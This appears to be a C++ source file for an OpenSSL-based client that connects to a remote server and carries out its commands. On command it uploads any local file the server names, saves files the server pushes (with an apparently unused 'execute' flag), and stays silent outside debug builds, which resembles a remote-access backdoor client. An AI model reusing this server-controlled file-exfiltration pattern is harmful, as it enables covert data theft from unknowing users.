#include "Client.hpp"
#include "Commands.hpp"
#include "Misc.hpp"
#include "Info.hpp"

bool Client::CheckSslReturnCode(int iRet){
	int iTmp = SSL_get_error(sslSocket, iRet);
	switch(iTmp){
		case SSL_ERROR_NONE:
			//just try again
			return true;
		case SSL_ERROR_ZERO_RETURN:
			//peer disconencted
			#ifdef _DEBUG
			std::cout<<"Peer disconnected\n";
			#endif
			return false;
		case SSL_ERROR_WANT_READ:
			//no data available to read
			return true;
		case SSL_ERROR_WANT_WRITE:
			//unable to write
			return true;
		default:
			#ifdef _DEBUG
			std::cout<<"error "<<iTmp<<'\n';
			ERR_print_errors_fp(stderr);
			#endif
			if(!isRetry){
				sleep(10);
				isRetry = true;
			}
			isRetry = false;
			return false;
	}
	return true;
}

bool Client::SendFile(const std::string strLocalFile) {
	#ifdef _DEBUG
	std::cout<<"Sending "<<strLocalFile<<'\n';
	#endif
	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
	if(!strmInputFile.is_open()){
		#ifdef _DEBUG
		std::cout<<"Unable to open file\n";
		error();
		#endif
		TryAgain:
		int iTmp = SSL_write(sslSocket, CommandCodes::cFileError, 3);
		if(iTmp <= 0){
			if(!CheckSslReturnCode(iTmp)){
				#ifdef _DEBUG
				std::cout<<"Unable to send packet\n";
				#endif
			} else {
				Sleep(100);
				goto TryAgain;
			}
		}
		return false;
	}
	u_int iBlockSize = 255;
	int iLen = 0, iRet = 0;
	u64 uFileSize = Misc::GetFileSize(strLocalFile);
	u64 uBytesSent = 0;
	if(uFileSize == 0){
		#ifdef _DEBUG
		std::cout<<"File size is 0\n";
		#endif
		TryAgain1:
		iRet = SSL_write(sslSocket, CommandCodes::cFileError, 3);
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send packet\n";
				#endif
			} else {
				Sleep(100);
				goto TryAgain1;
			}
		}
		strmInputFile.close();
		return false;
	}
	std::string strCmdLine = CommandCodes::cFileSize;
	strCmdLine.append(std::to_string(uFileSize));
	#ifdef _DEBUG
	std::cout<<"File size is "<<uFileSize<<'\n';
	#endif
	iLen = strCmdLine.length();
	TryAgain2:
	iRet = SSL_write(sslSocket, strCmdLine.c_str(), iLen); 
	if(iRet > 0){
		sleep(1);
		char *cFileBuffer = nullptr;
		int iTmp = 0;
		cFileBuffer = new char[iBlockSize];
		while(1){
			strmInputFile.read(cFileBuffer, iBlockSize);
			iTmp = strmInputFile.gcount();
			if(iTmp > 0){
				FileSendTryAgain:
				int iBytes = SSL_write(sslSocket, cFileBuffer, iTmp);
				if(iBytes> 0){
					uBytesSent += iBytes;
					#ifdef _DEBUG
					Misc::ProgressBar(uBytesSent, uFileSize);
					std::fflush(stdout);
					#endif
				} else {
					if(!CheckSslReturnCode(iBytes)){
						break;
					}
					Sleep(2000);
					goto FileSendTryAgain;
				}
			} else {		
				break;
			}
		}
		#ifdef _DEBUG
		std::cout<<"\nTransfer done\n";
		#endif
		Misc::Free(cFileBuffer, iBlockSize);	
	} else {
		if(!CheckSslReturnCode(iRet)){
			#ifdef _DEBUG
			std::cout<<"Unable to send command to server\n";
			error();
			#endif
			strmInputFile.close();
			return false;
		} else {
			Sleep(100);
			goto TryAgain2;
		}
	}
	strmInputFile.close();
	return true;
}

void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocalFileName){
	char *cDummyFile = new char[1024];
	#ifdef _DEBUG
	std::cout<<"Saving file "<<strLocalFileName<<"\nSize "<<uFileSize<<"\n Execute "<<cExec<<'\n';
	#endif
	int iRet = 0;
	std::ofstream strmOutputFile(strLocalFileName, std::ios::binary);
	if(!strmOutputFile.is_open()){
		if(GetEnvironmentVariable("TEMP", cDummyFile, 1023) <= 0){
			#ifdef _DEBUG
			std::cout<<"Unable to retrieve temp directory using dummy2.t3mp\n";
			#endif
			strncpy(cDummyFile, "dummy2.t3mp", 12); 
		} else {
			strncat(cDummyFile, "\\dummy.t3mp", 12); 
		}
		#ifdef _DEBUG
		std::cout<<"Unable to open file "<<strLocalFileName<<" trying "<<cDummyFile;
		error();
		#endif
		strmOutputFile.open(cDummyFile, std::ios::binary);
		if(!strmOutputFile.is_open()){
			#ifdef _DEBUG
			std::cout<<"Unable to open dummy file?\n";
			error();
			#endif
			TryAgain:
			iRet = SSL_write(sslSocket, CommandCodes::cFileTransferCancel, 3); 
			if(iRet <= 0){
				if(!CheckSslReturnCode(iRet)){
					#ifdef _DEBUG
					std::cout<<"Unable to send cancel command\n";
					error();
					#endif
				} else {
					Sleep(100);
					goto TryAgain;
				}
			}
			return;
		}
	}
	TryAgain2:
	iRet = SSL_write(sslSocket, CommandCodes::cFileTranferBegin, 3); 
	if(iRet <= 0){
		if(!CheckSslReturnCode(iRet)){
			#ifdef _DEBUG
			std::cout<<"Unable to send confirmation to server\n";
			error();
			#endif
			strmOutputFile.close();
			return;
		} else {
			Sleep(100);
			goto TryAgain2;
		}
	}
	u64 uTotalBytes = 0;
	int iBufferSize = 255, iBytesRead = 0;
	char *cFileBuffer = new char[iBufferSize];
	while(uTotalBytes<uFileSize){
		iBytesRead = SSL_read(sslSocket, cFileBuffer, iBufferSize);
		if(iBytesRead > 0){
			strmOutputFile.write(cFileBuffer, iBytesRead);
			uTotalBytes += iBytesRead;
			#ifdef _DEBUG
			Misc::ProgressBar(uTotalBytes, uFileSize);
			std::fflush(stdout);
			#endif
		} else {
			if(!CheckSslReturnCode(iBytesRead)){
				#ifdef _DEBUG
				std::cout<<"Unable to read packet from server\n";
				error();
				#endif
				break;
			}
			Sleep(100);
		}
	}
	#ifdef _DEBUG
	std::cout<<"\nTransfer done "<<uTotalBytes<<" bytes\n";
	#endif
	strmOutputFile.close();
	Misc::Free(cFileBuffer, iBufferSize);
	Misc::Free(cDummyFile, 1024);
}

bool Client::ParseCommand(char*& strCommand){
	#ifdef _DEBUG
	std::cout<<"Parsing command "<<strCommand<<'\n';
	#endif
	std::string strLocalFileName = "", strCmdLine = "";
	std::vector<std::string> vcCommands;
	Misc::strSplit(strCommand, '@', vcCommands, 10);
	if(vcCommands.size() > 0){
		if(vcCommands[0] == CommandCodes::cUpload){
			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[2][0], vcCommands[3]);
			goto release;
		}
		if(vcCommands[0] == "s"){
			if(vcCommands[1] == "0"){
				#ifdef _DEBUG
				std::cout<<"Bye\n";
				#endif
				return false;    //return false to close connection
			}
			goto release;
		}
		if(vcCommands[0] == CommandCodes::cDownload){
			if(SendFile(vcCommands[1])){
				#ifdef _DEBUG
				std::cout<<"Send success\n";
				#endif
			}
			goto release;
		}
	} else {
		#ifdef _DEBUG
		std::cout<<"Error parsing command, raw data:\n----------\n"<<strCommand<<"\n---------n";
		#endif
	}
	release:
	return true;
}

bool Client::Connect(c_char* cIP, c_char* cPORT){
	if(bioRemote != nullptr){
		BIO_free_all(bioRemote);
		bioRemote = nullptr;
	}
	if(sslCTX != nullptr){
		SSL_CTX_free(sslCTX);
		sslCTX = nullptr;
	}
	sslSocket = nullptr;
	sslCTX = SSL_CTX_new(TLS_client_method());
	SSL_CTX_set_options(sslCTX, SSL_OP_NO_COMPRESSION | SSL_OP_NO_SSLv2 |SSL_OP_NO_SSLv3);
	if(!sslCTX){
		return false;
	}
	bioRemote = BIO_new_ssl_connect(sslCTX);
	if(!bioRemote){
		#ifdef _DEBUG
		std::cout<<"bioRemote object error\n";
		#endif
		return false;
	}
	int iRet = 0; 
	std::string strTmp = cIP;
	strTmp.append(1, ':');
	strTmp.append(cPORT);
	if((iRet = BIO_set_conn_hostname(bioRemote, strTmp.c_str())) != 1){
		#ifdef _DEBUG
		std::cout<<"BIO_set_conn_hostname error\n";
		error();
		#endif
		return false;
	}
	BIO_get_ssl(bioRemote, &sslSocket);
	if(!sslSocket){
		#ifdef _DEBUG
		std::cout<<"BIO_get_ssl error\n";
		error();
		#endif
		return false;
	}
	if((iRet = SSL_set_tlsext_host_name(sslSocket, cIP)) != 1){
		#ifdef _DEBUG
		std::cout<<"SSL_set_tlsext_host_name error\n";
		error();
		#endif
		return false;
	}
	if((iRet = BIO_do_connect(bioRemote)) != 1){
		#ifdef _DEBUG
		std::cout<<"\nBIO_do_connect error\n";
		error();
		#endif
		return false;
	}
	if((iRet = BIO_do_handshake(bioRemote)) != 1){
		#ifdef _DEBUG
		std::cout<<"Handshake error\n";
		error();
		#endif
		return false;
	}
	return true;
}

void Client::CloseConnection(){
	if(sslCTX){
		SSL_CTX_free(sslCTX);
		sslCTX = nullptr;
	}
	if(bioRemote){
		BIO_free_all(bioRemote);
		bioRemote = nullptr;
	}
	sslSocket = nullptr;
}
